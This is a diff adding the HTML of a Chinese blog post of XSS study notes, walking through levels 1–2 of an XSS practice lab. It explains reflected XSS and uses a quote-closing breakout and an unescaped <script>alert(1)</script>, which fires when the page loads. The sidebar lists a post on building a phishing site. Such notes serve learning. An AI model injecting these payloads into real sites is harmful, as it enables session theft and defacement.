@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <title>XSS漏洞 | bulaize2023</title>
+  <meta name="keywords" content=" XSS , WEB漏洞 ">
+  <meta name="description" content="XSS漏洞 | bulaize2023">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="User-Agent：标识浏览器的详细信息，包括名称、版本、操作系统等。 Accept：指定客户端接受的数据类型，可以是文本、HTML、XML、JSON 等等。 Accept-Encoding：指定客户端可以接受的压缩编码类型，如 gzip、deflate 等。 Accept-Language：指定客户端接受的语言类型和优先级。 Cache-Control：指定客户端的缓存策略，如 no-cac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP请求头和网页状态码">
+<meta property="og:url" content="http://example.com/2024/08/19/12.HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/index.html">
+<meta property="og:site_name" content="bulaize2023">
+<meta property="og:description" content="User-Agent：标识浏览器的详细信息，包括名称、版本、操作系统等。 Accept：指定客户端接受的数据类型，可以是文本、HTML、XML、JSON 等等。 Accept-Encoding：指定客户端可以接受的压缩编码类型，如 gzip、deflate 等。 Accept-Language：指定客户端接受的语言类型和优先级。 Cache-Control：指定客户端的缓存策略，如 no-cac">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/40769418/1724204786808-e0f2fcda-b0db-470d-ad2a-7be6e65309e2.png#averageHue=%23dde1de&clientId=uc378e660-d8a2-4&from=paste&height=339&id=u29f2bd92&originHeight=424&originWidth=717&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=224244&status=done&style=none&taskId=u0ec3399f-3191-4261-96f7-845cf4c7437&title=&width=573.6">
+<meta property="article:published_time" content="2024-08-19T10:30:30.000Z">
+<meta property="article:modified_time" content="2024-08-31T13:17:01.124Z">
+<meta property="article:author" content="bulaize2023">
+<meta property="article:tag" content="HTTP">
+<meta property="article:tag" content="状态码">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/40769418/1724204786808-e0f2fcda-b0db-470d-ad2a-7be6e65309e2.png#averageHue=%23dde1de&clientId=uc378e660-d8a2-4&from=paste&height=339&id=u29f2bd92&originHeight=424&originWidth=717&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=224244&status=done&style=none&taskId=u0ec3399f-3191-4261-96f7-845cf4c7437&title=&width=573.6">
+
+
+<link rel="icon" href="/img/LBJ.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/LBJ.jpg"/>
+</a>
+<div class="author">
+    <span>bulaize2023</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/bulaize2023"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="facebook"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-facebook"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/yelog/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="weibo"
+               href="http://weibo.com/u/2307534817"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-weibo"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="jianshu"
+               href="https://www.jianshu.com/u/ff56736de7cf"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-jianshu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/people/jaytp/activities"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:1052696084@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=1052696084&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="kugou"
+               href="https://www.kugou.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-kugou"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=88151013"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(28)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="第一周">
+            
+            第一周
+            <small>(7)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="第一阶段">
+            
+            第一阶段
+            <small>(12)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="第二阶段">
+            
+            第二阶段
+            <small>(7)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="28">
+<input type="hidden" id="yelog_site_word_count" value="17k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+            <li><a target="_blank" href="https://bulaize2023.github.io/">bulaize2023</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>宝塔</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>博客</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>钓鱼</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>谷歌</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>计算机网络</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>软件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>社工库</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>网站</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文章</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息收集</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>语雀</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>状态码</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>day02</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>DNS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>docker</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>GitHub</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hexo</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HTML</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HTTP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MYSQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>vue</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>WEB漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2024/08/31/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2024-08-31 20:43:38">2024/08/31</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/08/19/12.HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/"
+           data-tag="HTTP,状态码"
+           data-author="" >
+            <span class="post-title" title="HTTP请求头和网页状态码">HTTP请求头和网页状态码</span>
+            <span class="post-date" title="2024-08-19 18:30:30">2024/08/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/24/5.SQL%E6%B3%A8%E5%85%A53/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入基础3">SQL注入基础3</span>
+            <span class="post-date" title="2024-07-24 20:50:30">2024/07/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/24/6.DNS%E8%A7%A3%E6%9E%90/"
+           data-tag="DNS"
+           data-author="" >
+            <span class="post-title" title="DNS解析">DNS解析</span>
+            <span class="post-date" title="2024-07-24 20:50:30">2024/07/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/23/4.SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%802/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入基础2">SQL注入基础2</span>
+            <span class="post-date" title="2024-07-23 20:50:30">2024/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/22/3.SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%801/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入基础1">SQL注入基础1</span>
+            <span class="post-date" title="2024-07-22 20:50:30">2024/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/22/2.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="信息收集"
+           data-author="" >
+            <span class="post-title" title="信息收集">信息收集</span>
+            <span class="post-date" title="2024-07-22 20:30:30">2024/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/22/1.%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/"
+           data-tag="谷歌"
+           data-author="" >
+            <span class="post-title" title="谷歌语法">谷歌语法</span>
+            <span class="post-date" title="2024-07-22 19:50:30">2024/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 第二阶段 "
+           href="/2024/07/20/xss%E6%BC%8F%E6%B4%9E/"
+           data-tag="XSS,WEB漏洞"
+           data-author="" >
+            <span class="post-title" title="XSS漏洞">XSS漏洞</span>
+            <span class="post-date" title="2024-07-20 18:30:30">2024/07/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/19/11.Linux%E5%AE%89%E8%A3%85%E5%AE%9D%E5%A1%94%E5%B9%B6%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"
+           data-tag="网站,Linux,宝塔"
+           data-author="" >
+            <span class="post-title" title="Linux安装宝塔并搭建网站">Linux安装宝塔并搭建网站</span>
+            <span class="post-date" title="2024-07-19 18:30:30">2024/07/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/19/10.%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
+           data-tag="博客,docker"
+           data-author="" >
+            <span class="post-title" title="使用docker搭建个人博客">使用docker搭建个人博客</span>
+            <span class="post-date" title="2024-07-19 18:10:30">2024/07/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/19/9.Linux%E9%85%8D%E7%BD%AESSH/"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Linux配置SSH服务">Linux配置SSH服务</span>
+            <span class="post-date" title="2024-07-19 18:00:30">2024/07/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/19/8.Linux%E6%9B%B4%E6%8D%A2%E9%95%9C%E5%83%8F%E6%BA%90%E5%B9%B6%E4%B8%8B%E8%BD%BD%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Linux更换镜像源并下载常用工具">Linux更换镜像源并下载常用工具</span>
+            <span class="post-date" title="2024-07-19 17:30:30">2024/07/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/19/7.Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Linux基础命令">Linux基础命令</span>
+            <span class="post-date" title="2024-07-19 16:09:30">2024/07/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/16/6.vue+php%E5%AE%8C%E5%96%84%E7%BD%91%E7%AB%99%E5%88%A0%E9%99%A4%E5%92%8C%E7%BC%96%E8%BE%91%E5%8A%9F%E8%83%BD/"
+           data-tag="vue,php,网站"
+           data-author="" >
+            <span class="post-title" title="vue+php完善网站删除和编辑功能">vue+php完善网站删除和编辑功能</span>
+            <span class="post-date" title="2024-07-16 20:09:30">2024/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/15/5.vue+php%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%BB%E9%A1%B5/"
+           data-tag="vue,php,网站"
+           data-author="" >
+            <span class="post-title" title="vue+php搭建网站首页">vue+php搭建网站首页</span>
+            <span class="post-date" title="2024-07-15 20:09:30">2024/07/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/13/4.vue+php%E6%90%AD%E5%BB%BA%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99/"
+           data-tag="vue,php,网站"
+           data-author="" >
+            <span class="post-title" title="vue+php搭建登录网站">vue+php搭建登录网站</span>
+            <span class="post-date" title="2024-07-13 19:42:30">2024/07/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/12/1.HTML%E5%9F%BA%E7%A1%80/"
+           data-tag="HTML"
+           data-author="" >
+            <span class="post-title" title="HTML基础">HTML基础</span>
+            <span class="post-date" title="2024-07-12 20:50:30">2024/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/12/3.MySQL%E5%9F%BA%E7%A1%80/"
+           data-tag="MYSQL"
+           data-author="" >
+            <span class="post-title" title="MYSQL基础">MYSQL基础</span>
+            <span class="post-date" title="2024-07-12 20:30:30">2024/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/12/%E5%88%A9%E7%94%A8GitHub%E6%90%AD%E5%BB%BAhexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
+           data-tag="GitHub,hexo,博客"
+           data-author="" >
+            <span class="post-title" title="利用GitHub搭建hexo博客">利用GitHub搭建hexo博客</span>
+            <span class="post-date" title="2024-07-12 20:11:30">2024/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/12/%E5%88%B6%E4%BD%9Cpython%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/"
+           data-tag="python,钓鱼"
+           data-author="" >
+            <span class="post-title" title="制作python钓鱼网站">制作python钓鱼网站</span>
+            <span class="post-date" title="2024-07-12 20:11:30">2024/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/12/%E7%A4%BE%E5%B7%A5%E5%BA%93/"
+           data-tag="社工库"
+           data-author="" >
+            <span class="post-title" title="社工库">社工库</span>
+            <span class="post-date" title="2024-07-12 20:00:30">2024/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一阶段 "
+           href="/2024/07/11/2.php%E5%9F%BA%E7%A1%80/"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP基础">PHP基础</span>
+            <span class="post-date" title="2024-07-11 20:11:30">2024/07/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/11/day3/"
+           data-tag="计算机网络,nmap"
+           data-author="" >
+            <span class="post-title" title="day03.计算机网络基础与nmap端口扫描">day03.计算机网络基础与nmap端口扫描</span>
+            <span class="post-date" title="2024-07-11 19:11:30">2024/07/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/11/day2/"
+           data-tag="day02"
+           data-author="" >
+            <span class="post-title" title="day02">day02</span>
+            <span class="post-date" title="2024-07-11 18:11:30">2024/07/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/10/day1%EF%BC%9A%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/"
+           data-tag="软件"
+           data-author="" >
+            <span class="post-title" title="安装软件">安装软件</span>
+            <span class="post-date" title="2024-07-10 19:11:30">2024/07/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 第一周 "
+           href="/2024/07/10/%E8%AF%AD%E9%9B%80%E4%B8%8A%E4%BC%A0%E6%96%87%E7%AB%A0/"
+           data-tag="语雀,文章"
+           data-author="" >
+            <span class="post-title" title="语雀上传文章">语雀上传文章</span>
+            <span class="post-date" title="2024-07-10 19:11:30">2024/07/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/07/10/test1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="test1">test1</span>
+            <span class="post-date" title="2024-07-10 15:52:50">2024/07/10</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-xss漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">XSS漏洞</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="第二阶段">第二阶段</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">XSS</a>
+            
+            <a class="color1">WEB漏洞</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-08-31 21:22:17'>2024-07-20 18:30</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:852</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-XSS%E5%8E%9F%E7%90%86"><span class="toc-text">1.XSS原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">2.反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1xss%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-text">2.1xss靶场第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2xss%E9%9D%B6%E5%9C%BA%E7%AC%AC2%E5%85%B3"><span class="toc-text">2.2xss靶场第2关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3xss%E9%9D%B6%E5%9C%BA%E7%AC%AC3%E5%85%B3"><span class="toc-text">2.3xss靶场第3关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4xss%E9%9D%B6%E5%9C%BA%E7%AC%AC4%E5%85%B3"><span class="toc-text">2.4xss靶场第4关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5xss%E9%9D%B6%E5%9C%BA%E7%AC%AC5%E5%85%B3"><span class="toc-text">2.5xss靶场第5关</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-XSS原理"><a href="#1-XSS原理" class="headerlink" title="1.XSS原理"></a>1.XSS原理</h1><p>开发者没有严格的校验过滤用户输入的内容，使用户输入的内容被拼接到html代码当中并执行 </p>
+<h1 id="2-反射型XSS"><a href="#2-反射型XSS" class="headerlink" title="2.反射型XSS"></a>2.反射型XSS</h1><p>又称非持续型XSS，将用户提交的而已代码(可以是参数也可以是数据)直接交给后端处理，然后返回结果给当前页面，攻击者可以事先构造好攻击连接，然后欺骗用户去点击才能触发XSS代码，（服务器中没有这样的页面和内容），一般容易出现在搜索页面<br>但是可能受浏览器内核，版本等限制，导致无法执行</p>
+<h2 id="2-1xss靶场第一关"><a href="#2-1xss靶场第一关" class="headerlink" title="2.1xss靶场第一关"></a>2.1xss靶场第一关</h2><p>可以看到name里的值被发射到了网页上<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994262947-0ade1e92-68fc-4afe-be4f-f8dff08217f2.png#averageHue=%23eae9e8&clientId=u682cdd02-8808-4&from=paste&height=687&id=u569dc78c&originHeight=859&originWidth=1156&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188870&status=done&style=none&taskId=ub67df093-78da-4fdd-8eab-44fcb28c5f3&title=&width=924.8" alt="image.png"><br>尝试在name值里包裹上a标签，看看会不会被执行<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994344062-10b4364d-abe2-42a7-9fd4-040071d68ea9.png#averageHue=%23f0f0f0&clientId=u682cdd02-8808-4&from=paste&height=749&id=uaa9a918b&originHeight=936&originWidth=1561&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191483&status=done&style=none&taskId=u34280360-0273-408a-b93b-aff6cf7ddad&title=&width=1248.8" alt="image.png"><br>被执行了，尝试一下 <script>alert(1)</script>  <img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994407942-5db33012-dec0-43e4-b06d-1857799fe30b.png#averageHue=%239d9c9f&clientId=u682cdd02-8808-4&from=paste&height=618&id=u281884b5&originHeight=773&originWidth=1577&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=127031&status=done&style=none&taskId=u9708fa21-d5ea-4807-a593-ed1e86d1338&title=&width=1261.6" alt="image.png"></p>
+<h2 id="2-2xss靶场第2关"><a href="#2-2xss靶场第2关" class="headerlink" title="2.2xss靶场第2关"></a>2.2xss靶场第2关</h2><p>在搜索框里直接输入 <script>alert(1)</script>  ，发现没被执行<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994493856-944eb69e-f190-4a8d-99ad-702df3272749.png#averageHue=%23f3f3f2&clientId=u682cdd02-8808-4&from=paste&height=587&id=u3225d754&originHeight=734&originWidth=1147&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102112&status=done&style=none&taskId=uc73de18c-450c-45ef-9b4f-c84c0c02e17&title=&width=917.6" alt="image.png"><br>打开网页源码，发现有双引号<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994568168-cfe563c4-34f5-4819-abbf-d83ff7c8bdf9.png#averageHue=%23fdfcfb&clientId=u682cdd02-8808-4&from=paste&height=540&id=u03e376d4&originHeight=675&originWidth=1572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=131574&status=done&style=none&taskId=u489f245c-a18e-4c4a-9b8f-917689bcbb7&title=&width=1257.6" alt="image.png"><br>用”&gt;闭合一下<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994657000-9dfaa017-09c3-409c-bb56-40d1e175d787.png#averageHue=%239e9da1&clientId=u682cdd02-8808-4&from=paste&height=661&id=ud52b7915&originHeight=826&originWidth=1301&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93698&status=done&style=none&taskId=uc756283e-2844-4cb0-b779-811e87bab8c&title=&width=1040.8" alt="image.png"></p>
